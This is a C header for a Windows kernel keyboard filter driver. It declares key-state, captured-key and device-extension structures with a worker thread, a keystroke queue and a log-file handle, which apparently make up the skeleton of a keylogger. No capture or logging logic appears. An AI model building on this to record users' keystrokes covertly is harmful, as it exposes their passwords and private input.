#ifndef SOURCE_H
#define SOURCE_H

	#include "ntddk.h" 
	#include "kbdmou.h" 
	#include "ntddkbd.h" 
	#include "ntdd8042.h" 

	typedef BOOLEAN bool;

	typedef struct _KEY_STATE
	{
		bool kSHIFT;
		bool kCAPSLOCK;
		bool kCTRL;
		bool kALT;

	}KEY_STATE;

	typedef struct
	{
		LIST_ENTRY ListEntry;
		char KeyData;
		char KeyFlags;
	}KEY_DATA;

	/*typedef struct _KEYBOARD_INPUT_DATA 
	{
		USHORT UnitId;
		USHORT MakeCode;
		USHORT Flags;
		USHORT Reserved;
		ULONG  ExtraInformation;
	} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;*/

	typedef struct
	{
		PDEVICE_OBJECT pKeyboardDevice;
		PETHREAD pThreadObj;
		bool bThreadTerminate;
		HANDLE hLogFile;
		KEY_STATE kState;
		KSEMAPHORE semQueue;
		KSPIN_LOCK lockQueue;
		LIST_ENTRY QueueListHead;
	} DEVICE_EXTENSION, * PDEVICE_EXTENSION;

#endif SOURCE_H